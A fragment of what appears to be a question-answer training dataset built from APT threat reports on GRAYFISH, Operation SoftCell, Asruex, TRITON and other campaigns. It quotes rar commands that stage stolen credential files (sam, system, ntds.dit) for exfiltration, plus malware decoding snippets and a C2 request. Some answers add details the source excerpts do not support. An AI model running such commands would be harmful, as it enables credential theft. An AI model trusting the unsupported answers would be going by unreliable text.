boot record so that it can control every stage of the Windows launch process. GRAYFISH, its virtual file system, its stolen information, and its functional modules are stored in the registry of the system. Because everything is stored in the registry and GRAYFISH and its modules are dynamically decrypted and executed by the bootkit, there are no malicious executables contained in the user's filesystem. This means that the user cannot detect the GRAYFISH malware on the system; at least not with traditional anti-malware tools. During the bootup process, GRAYFISH processes through 4-5 layers of decryption where each layer triggers the execution of the next layer of decryption. If all of the layers successfully decrypt, then GRAYFISH executes its code and the malware silently runs on the machine. If even one layer fails to decrypt during launch, then GRAYFISH proceeds to delete itself from the system. This technique confounds analysis and makes GRAYFISH infection difficult to discover because the malware might delete itself the moment the user detects anomalous behavior and begins diagnostic procedures.\nOn reason that EQUATION Group is considered far more sophisticated than any other advanced persistent threat actor is the capability of modules contained in the EQUATIONDRUG and GRAYFISH platforms to reprogram hard-drive firmware. This allows for unprecedented persistence. Security firm F-Secure notes that this rarely seen module might be Tailored Access Operations IRATEMONK program which affects hard-drives produced by Seagate, Maxtor, Western Digital, Samsung, IBM, Micron, and Toshiba.\n\nBased on the above text, answer a question. Describe the role of the DOUBLEFANTASY and TRIPLEFANTASY Trojans in the EQUATION Group's attack chain, and how do they determine if a system is a viable target?",
    "output": "DOUBLEFANTASY and TRIPLEFANTASY are validator-style Trojans used by the EQUATION Group to scan infected systems and determine if they match specific criteria indicating that the system is a viable target. DOUBLEFANTASY acts as a backdoor into the target system and assesses whether the system's characteristics make it interesting to the attacker. If the target matches the criteria, a malware platform such as EQUATIONLASER, EQUATIONDRUG, or GRAYFISH is delivered and installed. TRIPLEFANTASY is a more robust version of DOUBLEFANTASY, providing enhanced backdoor capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Compressing the Stolen Data\nIn an attempt to hide the contents of the stolen data, the threat actor used to compress and password-protect it. The winrar binaries and compressed data were found (<https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf>)mostly in the , a TTP that was , as well as others. This threat actor is known to stage the data in multi-part archives before exfiltration.\nThe threat actor used the following commands to compress the data.\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp\nrar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv\nrar a -r -[password] [REDACTED].rar sam system ntds.dit\nCompressed stolen data exfiltrated via web shell.\nThe contents of the compressed data was crucial in understanding the threat actor's motivation for the attack, as well as what type of information they were after.\nBig Headline: hTran\nIn order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of . This 'connection bouncer' tool lets the threat actor redirect ports and connections and obfuscate C2 server traffic. There have been numerous reports of hTran being used by different Chinese threat actors, including: , and DragonOK.\nThe threat actor made some modifications to . Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.\nObfuscated debug messages.\nSince the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.\nIdentifying modifications in a disassembly of the modified hTran.\nprintf is being called (dubbed by us as \"looks_like_printf\") with output \"C e.\". By looking at the original source code, we were able to identify that this is supposed to be \"Connect error\".\nA section of the source code for hTran.\nMedium Headline: Understanding the Motive\nWhen you think of large breaches to big organizations, the first thing that comes to mind is usually payment data. An organization that provides services to a large customer base has a lot of credit card data, bank account information, and more personal data on its systems. These attacks are usually conducted by a cybercrime group looking to make money.\nIn contrast, when a nation state threat actor is attacking a big organization, the end goal is typically not financial, but rather intellectual property or sensitive information about their clients.\nOne of the most valuable pieces of data that telecommunications providers hold is Call Detail Records (CDRs). CDRs are a large subset of metadata that contains all details about calls, including:\nSource, Destination, and Duration of a Call\nDevice Details\nPhysical Location\nDevice Vendor and Version\nFor a nation state threat actor, obtaining access to this data gives them intimate knowledge of any individuals they wish to target on that network. It lets them answer questions like:\nWho are the individuals talking to?\nWhich devices are the individuals using?\nWhere are the individuals traveling?\nHaving this information becomes particularly valuable when nation-state threat actors are targeting foreign intelligence agents, politicians, opposition candidates in an election, or even law enforcement.\nExample 1: CDR Data\nExample 2: CDR Data\nExample 3: CDR Data\nBeyond targeting individual users, this attack is also alarming because of the threat posed by the control of a telecommunications provider. Telecommunications has become critical infrastructure for the majority of world powers. A threat actor with total access to a telecommunications provider, as is the case here, can attack however they want passively and also actively work to sabotage the network.\nThis attack has widespread implications, not just for individuals, but also for organizations and countries alike. The use of specific tools and the choice to hide ongoing operations for years points to a nation state threat actor, most likely China. This is another form of cyber warfare being used to establish a foothold and gather information undercover until they are ready to strike.\nWant to learn about post-incident review?\nQ: How did the threat actor in Operation SoftCell attempt to hide the contents of the stolen data during compression, and what tools and techniques were used to achieve this?",
    "output": "The threat actor in Operation SoftCell used WinRAR to compress and password-protect the stolen data. They employed specific commands such as 'rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].temp' and 'rar.exe a -k -r -s -m1 -[password] [REDACTED].rar [REDACTED].csv'. This technique is known as staging the data in multi-part archives before exfiltration. The use of WinRAR binaries and compressed data was primarily found in the Temp folder, a tactic consistent with other known threat actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nMalvertising has seen meteoric rise in 2014. Threat actors create a corporate front, advertise on commonly visited sites, then later switch out the landing pages for their ads to pages that host exploit kits, or simply create a temporary redirection from their usual content to the malicious landing page. These exploit kits are hosted on compromised web servers across the world. In other words, they leverage legitimate ad-supported popular websites together with compromised websites for hosting exploit landing pages, defeating black-listing techniques. The lifetime of these ads and landing pages are measured in hours.\nIn the campaign described here, Operation DeathClick, traditional malvertising has been armed with a micro-targeting system using IP address ranges, geographically narrowed down to zip codes, and interests of the user (recorded in cookies) to target specific companies, company types, and user interests/preferences. They are employing the tactics of real-time ad bidding to guarantee malicious ad delivery to intended targets of the campaign \u2013 building on a decade of work in real-time analytics for online ad placement, but for nefarious purposes.\nThe threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages forever.  This means that list-based threat intelligence feeds are rendered ineffective.  The domains used do not appear in any proxy blacklist, and the malware droppers delivered by the exploit pages always employ different signatures, evading traditional network and endpoint detection technology.\nAd delivery networks today are not incentivized to address the problem in a credible manner as they derive revenue from the criminal enterprise, while not being held accountable. Turning a blind eye to the problem is rewarded economically. Meanwhile the perpetrators are able to use traditional malvertising and ad fraud bots to fund the criminal enterprise.\nWithout cooperation of ad networks to vet the advertisers working through front companies, this attack vector will go unchecked. And now, with the advent of real-time ad bidding, these threat actors have weaponized ad delivery networks to target victims based on:\n\uf0b7 User-Agent strings (versions of flash, OS, java and browser)\n\uf0b7 Interest-related content (click bait articles, industry specific software or hardware, like medical supplies, radar mapping software, ammunition sales, stocks forums)\n\uf0b7 Advertising Profiles derived from cookies (someone with specific tastes, may shop for shoes, handbags, cars, luxury vacations)\n\uf0b7 Geographic region (malvertisers can target specific neighborhoods or states via geoip direct advertising)\n\uf0b7 Specific corporate IP ranges (targeted malvertising can target the public IP space of your network or an Industrial Vertical)\nReal-time ad bidding allows advertisers, and by extension, adversaries, to micro-target ad delivery on an extremely granular basis. For example, oppressive regimes trying to gather intelligence on activist protests can deliver ads to people getting email from within a specific locality where they are protesting. Today, it is commonplace for micro-targeting techniques to be used as part of the toolset in legitimate online advertising. For instance, a defense contractor, trying to win a new omnibus contract, can deliver targeted ads to online news sites frequented by Government program personnel. The latest software product release can be delivered to Windows users visiting PC Magazine's website. A local car dealership can sense when someone is in the market for a new car and can deliver advertising to those users, based solely on browsing history.\nNow advanced threat actors are able to target an organization directly via micro-targeted malvertising, based solely on their corporate network IP range. Thus, it doesn't matter where in the world you point your web browser -- an online video poker room, a fantasy football club homepage, a Pakistani news homepage, or even checking your own webmail at a trusted email provider. Those ad windows can and are being used to deliver malware if the bidding price is right.\n\nQuestion: How does Operation DeathClick leverage real-time ad bidding to enhance its malvertising campaigns, and what are the implications for traditional threat intelligence feeds?\n\nAnswer:",
    "output": "Operation DeathClick employs real-time ad bidding to guarantee malicious ad delivery to intended targets. This tactic builds on a decade of work in real-time analytics for online ad placement but is used for nefarious purposes. By redirecting ads for just minutes at a time and then abandoning their exploit kit pages, the threat actors render list-based threat intelligence feeds ineffective. The domains used do not appear in any proxy blacklist, and the malware droppers delivered by the exploit pages always employ different signatures, evading traditional network and endpoint detection technology.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: Subject lines\n\uf0b7 Capt [REMOVED] update\n\uf0b7 Fw: LES Request\n\uf0b7 Libya crisis\n\uf0b7 Five Simple Questions for Democrats on Spending Cuts\n\uf0b7 Behind the Easing of Israeli-Palestinian Tensions\n\uf0b7 Business Exec Urges Broad Trade Agenda To Curb China Role In Latin America\n\uf0b7 President Chavezs Comments About President Obama and the United States on Sundays \"Alo,Presidente\"\n\uf0b7 FW: New Standdard Operational Procedures (SOPs) between the\n\uf0b7 AGENDA\n\uf0b7 [REMOVED] Help You Save Enough for Retirement\n\uf0b7 Human right of north Afica under war\n\uf0b7 Spreading Civil Unrest in the Middle East and North Africa\n\uf0b7 The latest analysis on Syria\n\uf0b7 International Atomic Energy Agency invite you to attend Atomic Energy Summit\n\uf0b7 GAC Monthly Report\n\uf0b7 Emergency notification\n\uf0b7 Meeting information of [REMOVED]\n\uf0b7 Meeting information of [REMOVED]\n\uf0b7 Meeting notice from [REMOVED]\n\uf0b7 Meeting notice from [REMOVED]\n\uf0b7 FY12 Government Opportunities\n\uf0b7 Yemen para for SC briefing\n\uf0b7 Fighting Protectionism and Promoting Trade and Investment\n\uf0b7 Weekly Security Report\n\uf0b7 Agenda of [REMOVED] Visit in July 2011\n\uf0b7 Agenda of [REMOVED] Visit in July 2011\n\uf0b7 Obituary Notice\n\uf0b7 Updated Roster 20110712\n\uf0b7 2011 project budget\n\uf0b7 [REMOVED] National Security Seminar\n\uf0b7 Current internatinal situation surrounding Syria\n\uf0b7 New Update of Health & Medical force\n\uf0b7 FW:How to Get Free Airline Tickets\n\uf0b7 Nuclear Security and Summit Diplomacy\n\uf0b7 Fw: [REMOVED] Defence & Security Industry Mission to [REMOVED] 201\n\uf0b7 [REMOVED] heriketlik pilani\n\uf0b7 2012 Global aerospace and defense industry outlook\nSmall Headline: Email attachment names\n\uf0b7 update.exe\n\uf0b7 CTF 2011 (MF).xls\n\uf0b7 BBC Monitoring reports..xls\n\uf0b7 Five Simple Questions for Democrats on Spending Cuts.doc\n\uf0b7 Behind the Easing of Israeli-Palestinian Tensions.doc\n\uf0b7 Business Exec Urges Broad Trade AgendaTo Curb China Role In Latin America.doc\n\uf0b7 PatriotLMSR2009Fin .doc\n\uf0b7 New SOPs for HEC Coord with NATO.pdf\n\uf0b7 agenda201005.pdf\n\uf0b7 Human right report of noth Afica under the war.scr\n\uf0b7 Middle_East_Civil_Unrest.pdf\n\uf0b7 Protests Spread in Syria.pdf\n\uf0b7 Cybersecurity and Cyber War.pdf\n\uf0b7 The Meeting intivation of International Atomic Energy Agency 06-05-2011.scr\n\uf0b7 meeting invitation of British Council 2011.scr\n\uf0b7 Meeting information details of [REMOVED].exe\n\uf0b7 Meeting information details of [REMOVED].exe\n\uf0b7 Meeting detail information from [REMOVED].scr\n\uf0b7 Meeting detail information from [REMOVED].scr\n\uf0b7 FY12 Government Opportunities.pdf\n\uf0b7 China's Jasmine protests.pdf\n\uf0b7 Yemen para for SC briefing.doc\n\uf0b7 DECLARATION- COMMENTS.Netherlands.pdf\n\uf0b7 weekly_security_report-06-20-2011__-__06-26-2011.pdf\n\uf0b7 2011.xls\n\uf0b7 Obituary.xls\n\uf0b7 Updated_roster.xls\n\uf0b7 2011 project budget.xls\n\uf0b7 Participant_Contacts.xls\n\uf0b7 Current international situation surrounding Syria.doc\n\uf0b7 Update of Health & Medical force.xls\n\uf0b7 How to Get Free Airline Tickets.pdf\n\uf0b7 REPLY_ FORM.doc\n\uf0b7 Global A&D outlook 2012.pdf\n\uf0b7 Global_A&D_outlook_2012.pdf\nSmall Headline: About Symantec\nSymantec protects the world's information and is the global leader in security, backup, and availability solutions. Our innovative products and services protect people and information in any environment\u2014from the smallest mobile device to the enterprise data center to cloud-based systems. Our industry-leading expertise in protecting data, identities, and interactions gives our customers confidence in a connected world. More information is available at or by connecting with Symantec at\nHeadquartered in Mountain View, Calif., Symantec has operations in 40 countries. More information is available at (<http://www.symantec.com/>)www.symantec.com\nFor specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters\n350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY. The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nCopyright \u00a9 2013 Symantec Corporation. All rights reserved.\nSymantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners\n\nWhat types of file extensions were commonly used in the email attachments sent by the Comment Crew APT, and why might these extensions have been chosen? Discuss the potential risks associated with each type.",
    "output": "The Comment Crew APT commonly used file extensions such as .exe, .doc, .pdf, .scr, and .xls in their email attachments. These extensions were likely chosen because they are familiar and commonly used in business communications, making them less suspicious to recipients. However, each type carries significant risks. Executable files (.exe) can run malicious code directly; document files (.doc, .pdf) can contain embedded macros or exploits; script files (.scr) can execute commands; and spreadsheet files (.xls) can include malicious formulas or macros. By using these common file types, the attackers increase the likelihood that recipients will open the attachments, thereby exposing themselves to potential malware infections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why is it assessed with moderate confidence that the attacker inadvertently shut down operations while developing the ability to cause physical damage?",
    "output": "The assessment is based on several factors: modifying the SIS could prevent it from functioning correctly, increasing the likelihood of a failure with physical consequences; TRITON was used to modify application memory on SIS controllers, which could have led to a failed validation check; the failure occurred during the time period when TRITON was used; and it is not likely that existing or external conditions, in isolation, caused a fault during the time of the incident.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: INTRODUCTION\nThe FinFisher Suite is described by its distributors, Gamma International UK Ltd., as \"Governmental IT Intrusion and Remote Monitoring Solutions.\" The toolset first gained notoriety after it was revealed that the Egyptian Government's state security apparatus had been involved in with Gamma International UK Ltd. over the purchase of the software. Promotional materials have been that describe the tools as providing a wide range of intrusion and monitoring capabilities. Despite this, however, the toolset itself has not been publicly analyzed.\nThis post contains analysis of several pieces of malware obtained by Vernon Silver of Bloomberg News that were sent to Bahraini pro-democracy activists in April and May of this year. The purpose of this work is identification and classification of the malware to better understand the actors behind the attacks and the risk to victims. In order to accomplish this, we undertook several different approaches during the investigation.\nAs well as directly examining the samples through static and dynamic analysis, we infected a virtual machine (VM) with the malware. We monitored the filesystem, network, and running operating system of the infected VM.\nThis analysis suggests the use of \"Finspy\", part of the commercial intrusion kit, Finfisher, distributed by Gamma International.\n\nHow did the investigators identify and classify the malware used against Bahraini pro-democracy activists, and what specific techniques were employed to determine its association with FinFisher?",
    "output": "The investigators identified and classified the malware through several approaches. First, they conducted direct examination using static and dynamic analysis methods. Additionally, they infected a virtual machine (VM) with the malware and monitored the filesystem, network, and running operating system of the infected VM. This comprehensive analysis allowed them to determine that the malware was 'Finspy,' a component of the commercial intrusion kit known as FinFisher, which is distributed by Gamma International UK Ltd. The analysis aimed to better understand the actors behind the attacks and the risks posed to the victims.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Section Summary:\nThe Derusbi / Sakula malware implant types are unique in that they have traditionally been seen within Chinese APT espionage campaigns.\nThe \"HttpBrowser\" / \"HttpDump\" malware implant (while a different family of malware than Derusbi / Sakula) is also believed to be of Chinese origin, and was also digitally signed with the DTOPTOOLZ digitalsignature. This implant connected to a C2 node that overlapped with prennera[.]com.\nWe believe that the prennera[.]com domain may be impersonating Premera Blue Cross (premera.com), using a similar character replacement technique seen in the we11point[.]com campaign.\n\nHow does the use of the 'HttpBrowser' / 'HttpDump' malware implant in the Anthem hack suggest a connection to Chinese APT groups, and what techniques were employed to obscure its origins?",
    "output": "The 'HttpBrowser' / 'HttpDump' malware implant is believed to be of Chinese origin and was digitally signed with the DTOPTOOLZ digital signature. This implant connected to a command and control (C2) node that overlapped with the domain prennera[.]com. This domain is suspected of impersonating Premera Blue Cross (premera.com) by using a similar character replacement technique seen in the we11point[.]com campaign. The use of this specific malware family and the domain impersonation technique suggests a connection to Chinese APT groups, as these methods have been traditionally associated with Chinese espionage campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. A New Era\nHistory has demonstrated that the advantage often goes to those who develop a technology first. The great naval voyages of Ming admiral Zhang He were unprecedented for their time and helped establish China as a suzerain of the wider Asian region. However, the mid-15th century saw China retreat to xenophobic and isolationist policies that paved the way towards China's decline and opened the door for colonialism (see Dick 2006). This lesson has not been lost among Chinese officials, and it is often used to spur initiatives such as their stated desire to be the first to mine the moon for helium-3 (China's Space Program 2005). The information revolution has given more power to individuals and increased globalization through the interconnectedness of economies, rapid dissemination of news, and improved access to communication and information of all types. Any attempt to compete on a global level without the use of these technologies would place the PRC at a significant military and financial disadvantage. For this reason, the benefits of electronic reliance outweigh the risks involved. Further, it is impossible for a state to develop a defence against cyber warfare without simultaneously learning how to execute attacks themselves.\nThe US is the sole superpower, making it a benchmark for military competitiveness. Beijing also views the US as a potential adversary, in particular due to perceptions of the US military attempting to encircle China with bases in nearby states and opposition to China's modernization goals, to concerns over any forceful application of the One China Policy, and to concerns over a range of internal affairs issues.  China seeks to learn from US mistakes and successes, using American expertise and field-tested military experience to accelerate China's development. The People's Republic also focuses on weaknesses in the US military in order to improve upon the American example and to expose asymmetric advantages. For these reasons it is important to examine where the US is headed in military thinking and development, as China is likely to follow (Derene 2008; Lasker 2005; Liang Xiangsui 1999).\nMedium Headline: Network-Centric Warfare\nThe US has viewed the internet as a potential tool of warfare since its inception. Arpanet, a precursor of modern internet, was heavily funded by the US military, with a particular emphasis on its research collaboration benefits. Despite fears of cyber terrorism post 9/11, the US continues to place increasing reliance on the internet as a security tool. This can be seen in the restructuring of US intelligence agencies and the creation of new online exchange such as Intellipedia and A-Space (Shaughnessy 2008; Magnuson 2006). Militarily, the information revolution has given rise to an increasing reliance on situational awareness, weather monitoring, surveillance, communication, and precision strikes. Chinese military strategists have made special note of the US reliance on, and dominance with, electronic means in the Kosovo, Afghanistan, and Iraqi conflicts (Tellis 2007; Center for Strategic and International Studies 2003; Liang and Xiangsui 1999).\nSince the 1990s the US has put emphasis on developing network-centric warfare (NCW).  NCW seeks to translate an information advantage, enabled in part by information technology, into a military advantage through the networking of well informed, geographically-dispersed forces. Originally described as a system of systems, it includes intelligence sensors, command and control systems, and precision weapons that enable enhanced situational awareness, rapid target assessment, and distributed weapon assignment. In essence, NCW translates to information superiority, which requires the reduction of hard categorization, because compartmentalizing military branches can stem the flow of information.  In 2001, the\nPentagon began investing in peer-to-peer software as a means to spread information while supplying redundancy and robustness. The US Department of Defense has sought the creation of the Global Information Grid (GIG) as a backbone of NCW. All advanced weapons platforms, sensor systems, and command and control centres are eventually to be linked via the GIG. Collecting, processing, storing, disseminating, and managing classified security information on demand will be made globally available to soldiers, policymakers, and support personnel to achieve information superiority (Alberts 2002; Alberts, Garstka, and Stein 2000).\nVice President Richard Cheney stated in 2004:\nWith less than half of the ground forces and two-thirds of the military aircraft used 12 years ago in Desert Storm, we have achieved a far more difficult objective . . . . In Desert Storm, it usually took up to two days for target planners to get a photo of a target, confirm its coordinates, plan the mission, and deliver it to the bomber crew. Now we have near real-time imaging of targets with photos and coordinates transmitted by e-mail to aircraft already in flight. In Desert Storm, battalion, brigade, and division commanders had to rely on maps, grease pencils, and radio reports to track the movements of our forces. Today, our commanders have a real-time display of our armed forces on their computer screen (Raduege 2004).\nMedium Headline: Information Operations\nIn 2003, under the direction of former Secretary of Defense Donald Rumsfeld, the US expanded on NCW in a document titled the Information Operations Roadmap. Now declassified, it was obtained under the Freedom of Information Act by George Washington University's National Security Archive. Information Operations (IO) calls for NCW to become a core military branch along with the Army, Navy, Air Force, Intelligence, and Space. To accomplish this it requires the development of a comprehensive education program to enlist new recruits, and an overhaul of the organizational structure of current military branches in an attempt to break down barriers that hinder information exchange and progress. IO activities include PSYOPS troops who try to manipulate the adversary's thoughts and beliefs, military deception and disinformation, media warfare, electronic warfare (EW), and computer network operations (CNO). Thus Information Operations Roadmap stands as an another example of the US commitment to transform military capabilities to keep pace with emerging threats and to exploit new opportunities afforded by innovation and rapidly developing information technologies.\nIO seeks to \"dominate the electromagnetic spectrum\", in an attempt to \"deny, degrade, disrupt, or destroy a broad range of adversary threats, sensors, command and control and critical support infrastructures\" (Information Operations Roadmap 2003). The document notes that PSYOPS and manipulating the thoughts of populations through media and internet require constant observation during peacetime, otherwise in the event of conflict, a state would not be sufficiently engrained into the information culture to utilize them fully. This can be seen with the emergence of patriotic hackers, the advancement of social media, and the rapid evolution of memetics, slang, and subcultures, all of which will be discussed further below (List of Internet Phenomenon 2008; Pang 2008; Slashdot Subculture 2008; Slashdot Trolling Phenomenon 2008). IO includes defence, attack, and reconnaissance as vital components (Information Operations Roadmap 2003).\nIO seeks to put out a political message in coordination with any traditional military assault.  It places an emphasis on finding, and clandestinely promoting, favourable media from third\nparties, so as to appear more credible. IO also seeks to establish a legal framework to defend against cyber attacks and cyber reconnaissance, as well as establish rules of engagement for conducting cyber attack. For example, how much certainty is required in identifying the source of an attack before responding? If an attack is being routed through multiple computers, is it acceptable to attack the intermediary computer? This would halt the attack but it would harm or destroy a computer which may have been infected without the owner's knowledge or consent. Additionally, an intangible computer attack can result in significant tangible loss, but does this warrant the use of traditional military weapons as a response?\n\nBased on the above text, answer a question. Why is it crucial for the People's Republic of China (PRC) to develop cyber warfare capabilities, and how does the US serve as a model for China's military development in this area?",
    "output": "It is crucial for the PRC to develop cyber warfare capabilities because it allows China to compensate for its traditional military hardware deficiencies and provides an asymmetric advantage to deter aggression from stronger military powers. The US serves as a model for China's military development because it is the sole superpower and a benchmark for military competitiveness. China seeks to learn from US mistakes and successes, using American expertise and field-tested military experience to accelerate its own development. By examining where the US is headed in military thinking and development, China can identify and improve upon weaknesses in the US military.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Asruex: Malware Infecting through Shortcut Files\nJPCERT/CC has been observing malicious shortcut files that are sent as email attachments to a limited range of organisations since around October 2015. When this shortcut file is opened, the host will be infected with malware called \"Asruex\". The malware has a remote controlling function, and attackers sending these emails seem to attempt intruding into the targets' network using the malware. According to a blog article by Microsoft, the malware is associated with an attacker group identified as \"DarkHotel\" (Microsoft calls it as \"Dubnium\") [1]. This blog entry will introduce the details of Asruex.\nBig Headline: Infection Mechanism of Asruex\nFigure 1 describes the chain of events after a victim opens the malicious shortcut file until the host gets infected with Asruex.\nFigure 1: Chain of events after a victim opens the malicious shortcut file until the host gets infected with Asruex\nFor those cases that JPCERT/CC has observed, when the shortcut file is opened, a downloader is downloaded from a C&C server and then executed. The downloader then downloads Asruex from another C&C server, which is then executed. Detailed behaviour observed in each phase will be explained in the next section.\nBig Headline: Details of the Shortcut File\nWhen the malicious shortcut file is opened, the following PowerShell command in the file is executed.\nThe above PowerShell command downloads a file from the specified URL, and it is saved as a batch file to be executed. The batch file contains the following commands, which execute PowerShell scripts (marked in red).\nWhen the batch file is executed, a Windows executable file (a downloader) and a dummy file for display will be downloaded from a C&C server, saved in %TEMP% folder and then executed. Those decoy documents are written in Japanese, but some are also in Chinese, which implies that the target for this attack is not limited to Japanese organisations.\nBig Headline: Details of the Downloader\nWhen the downloader is executed, it downloads a .jpg or .gif image file. Encoded Asruex is contained in the latter part of the image file. The downloader decodes it and then executes the malware.\nFigure 2: An Image File Containing Encoded Asruex\nAsruex contained in the image file is encoded using XOR. The following Python script is used for decoding the encoded data of the image file. The size of the encoded data is specified in the last 4 bytes of the image file.\nkey = 0x1D # Keys may vary depending on the sample\nkey += 0x5D key &=0xff\nThe downloader may contain an encoded executable file of Process Hacker (a multi-function task manager), and it may execute the Process Hacker if an anti-virus software is detected. Anti-virus software such as by Symantec, McAfee and Kaspersky, etc., are detected based on the process names.\nBig Headline: Details of Asruex\nAsruex is a kind of malware that communicates with the C&C server over HTTP, and executes the command received through the communication. It has various anti-analysis features such as preventing the malware from running when it detects a virtual machine. Please refer to Appendix A for conditions which Asruex detects a virtual machine. The malware is also capable of detecting anti-virus software.\nIf Asruex does not detect a virtual machine, it executes one of the following executable files, and injects a DLL file which is contained in Asruex. In case where it detects anti-virus software, Asruex generates a DLL file and loads it to itself (but does not perform DLL injection). This DLL file contains the core functions of Asruex.\nsdiagnhost.exe\nwksprt.exe\ntaskhost.exe\ndwm.exe\nwinrshost.exe\nwsmprovhost.exe\nctfmon.exe\nexplorer.exe\nThe DLL injected, or generated and loaded, sends an HTTP request to a dummy host. If it receives a reply of status code that is 100 or greater, it connects to an actual C&C server as follows:\nGET /table/list.php? a1=6fcadf059e54a19c7b96b0758a2d20a4396b85e77138dbaff3fddd04909de91\n62a8910eab1141343492e90a78e75bfa7cafa3ed0a51740daa4cad36291e637074255217 \u2013omitted-\nHTTP/1.1\nConnection: Keep-Alive\nContent-Type: text/plain; charset=utf-8\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/27.0.1453.116 Safari/537.36\nHost: [host name]\nAsruex operates based on the configuration information stored in itself. The configuration Information includes C&C servers and dummy hosts that it connects to, and also version information and a key to decode data which is delivered. For further details on the configuration information, please refer to Appendix B.\nThe configuration information is encoded. It can be decoded with the following Python code:\n(config_size,) = struct.unpack(\"=I\", data[offset:offset+4]) config_offset = offset + 4 encode_config = data[config_offset:config_offset+config_size] i=0 seed = config_size * 2 // It does not necessarily double while i < config_size: (result, seed) = rand_with_seed(seed) result &= 0xff decode_data.append(chr(ord(encode_config[i]) ^ result)) i += 1 decode_config = \"\".join(decode_data) (decode_size,) = struct.unpack(\"=I\", decode_config[config_size-4:config_size]) config = lznt1_decompress(decode_config, config_size, decode_size)\nAsruex executes commands that are received from a C&C server. Commands that are possibly executed are listed in Table 1. Most of the commands are used for collecting information, but some are for downloading DLL files (AdvProv.dll) from C&C servers and for executing them. AdvProv.dll is a plug-in to expand functions of Asruex.\nTable 1: Commands used by Asruex\nBig Headline: Details of AdvProv.dll\nAdvProv.dll is encrypted using XOR and 3DES. Decryption key is calculated based on the destination URL and the encoding key of the configuration information. Asruex downloads a DLL, loads it into the memory and executes DLL's export function, Get_CommandProc. AdvProv.dll adds the following commands to Asruex:\nTable 2: Asruex Commands added by AdvProv.dll\nSamples of AdvProv.dll that JPCERT/CC has observed had the listed functions. However, there may be some other versions with different functions.\nBig Headline: Appendix A: Conditions where Asurex detects an analysis environment\nIf Asruex detects itself being operated in an environment under any of the following conditions (Table A-1 to A-6), it recognises that it is an analysis environment and stops running.\nTable A-1: The user matches the computer name and user name as listed.\nTable A-2: Listing up the loaded modules, and if the listed functions are found to be exported.\nTable A-3: The listed file names are found.\nTable A-4: The listed process names are running.\nTable A-5: Listing up the process modules that are running, and the module version matches the combination listed.\nTable A-6: The disk name contains the listed strings.\nTable A-1: Detectable Combination of Computer Name and User Name\nBig Headline: Appendix C: SHA-256 Hash Value of Artifacts\nShortcut files:\nc60a93a712d0716a04dc656a0d1ba06be5047794deaa9769a2de5d0fcf843c2a\nae421dd24306cbf498d4f82b650b9162689e6ef691d53006e8f733561d3442e2\n980cc01ec7b2bd7c1f10931822c7cfe2a04129588caece460e05dcc0bb1b6c34\nb175567800d62dcb00212860d23742290688cce37864930850522be586efa882\nc2e99eedf555959721ef199bf5b0ac7c68ea8205d0dff6c208adf8813411a456\nac63703ea1b36358d2bec54bddfef28f50c635d1c7288c2b08cceb3608c1aa27\n5cfc67945dd39885991131f49f6717839a3541f9ba141a7a4b463857818d01e6\ne76c37b86602c6cc929dffe5df7b1056bff9228dde7246bf4ac98e364c99b688\n606e98df9a206537d35387858cff62eb763af20853ac3fa61aee8f3c280aaafe\nDownloaders:\nfdf3b42ac9fdbcabc152b200ebaae0a8275123111f25d4a68759f8b899e5bdd6\ndd2cba1a0d54a486a39f63cbd4df6129755a84580c21e767c44c0a7b60aff600\nd89e2cc604ac7da05feeb802ed6ec78890b1ef0a3a59a8735f5f772fc72c12ef\ncaefcdf2b4e5a928cdf9360b70960337f751ec4a5ab8c0b75851fc9a1ab507a8\n8ca8067dfef13f10e657d299b517008ad7523aacf7900a1afeb0a8508a6e11d3\n77ca1148503def0d8e9674a37e1388e5c910da4eda9685eabe68fd0ee227b727\n05f241784e673f2af8a2a423fb66e783a97f123fc3d982144c39e92f191d138d\na77d1c452291a6f2f6ed89a4bac88dd03d38acde709b0061efd9f50e6d9f3827\n2273236013c1ae52bfc6ea327330a4eba24cc6bc562954854ae37fe55a78310b\n36581a19160f2a06c617a7e555ad8ec3280692442fd81bde3d47a59aea2be09a\na3f1a4a5fea81a6f12ef2e5735bb845fb9599df50ffd644b25816f24c79f53b6\n24b587280810fba994865d27f59a01f4bbdaf29a14de50e1fc2fadac841c299e\n2c68cf821c4eabb70f28513c5e98fa11b1c6db6ed959f18e9104c1c882590ad2\n3f2168a9a51d6d6fe74273ebfc618ded3957c33511435091885fa8c5f854e11e\ndf72a289d535ccf264a04696adb573f48fe5cf27014affe65da8fd98750029db\neacc46f54fa8c8a8cf51368305803d949fa2